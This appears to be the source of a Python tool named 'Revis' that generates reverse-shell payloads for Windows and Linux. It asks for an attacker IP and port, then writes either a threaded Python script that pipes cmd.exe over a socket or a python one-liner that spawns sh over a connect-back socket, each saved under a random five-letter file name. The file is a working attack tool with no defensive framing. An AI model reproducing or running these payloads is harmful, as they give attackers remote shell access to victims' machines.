import string
from random import randrange 
import random
from termcolor import colored
import subprocess
import time
import os

def clear_screen():
    subprocess.run(["cls"], shell=True)


def windows():
    clear_screen()
    print(colored("""
    R e v i s > Windows Payload Generator


        """, "light_red"))
    ip_addr = input(colored("Enter IP Addr: ", "light_red"))
    port = int(input(colored("Enter PORT No: ", "light_red")))
    windows_payload = f"""

import os,socket,subprocess,threading;
def s2p(s, p):
    while True: 
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
            p.stdin.flush()

def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{ip_addr}",{port}))

p=subprocess.Popen(["cmd"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

s2p_thread = threading.Thread(target=s2p, args=[s, p])
s2p_thread.daemon = True
s2p_thread.start()

p2s_thread = threading.Thread(target=p2s, args=[s, p])
p2s_thread.daemon = True
p2s_thread.start()

try:
    p.wait()
except KeyboardInterrupt:
    s.close()
    """
    lower = string.ascii_lowercase
    upper = string.ascii_uppercase

    payloadName = upper + lower
    length = 5

    name = ""
    for i in range(length):
        letters = random.choice(payloadName)
        name += letters
    with open(f"{name}.pyw", "w") as payload:
        payload.write(windows_payload)
    print(f"Payload generated: {name}.pyw")


def linux():
    clear_screen()
    print(colored("""
    R e v i s > Linux Payload Generator


        """, "light_red"))
    ip_addr = input(colored("Enter IP address: ", "light_red"))
    port = int(input(colored("Enter Port Number: ", "light_red")))
    linux_payload = f"""
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip_addr}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
    """
    lower = string.ascii_lowercase
    upper = string.ascii_uppercase

    payloadName = upper + lower
    length = 5

    name = ""
    for i in range(length):
        letters = random.choice(payloadName)
        name += letters
    with open(f"{name}.pyw", "w") as payload:
        payload.write(linux_payload)
    print(colored(f"\nPayload: {name}.pyw generated in {os.getcwd()}", "light_red"))
    
def payloadSelection():
    clear_screen()
    choices = input(colored("""1) Windows Payload
2) Linux Payload


Payload Selection Menu: """, "light_red"))

    if choices == "1":
        windows()
    elif choices == "2":
        linux()
    else:
        print("Please select using 1 or 2.")
        time.sleep(2)
        clear_screen()
        payloadSelection()

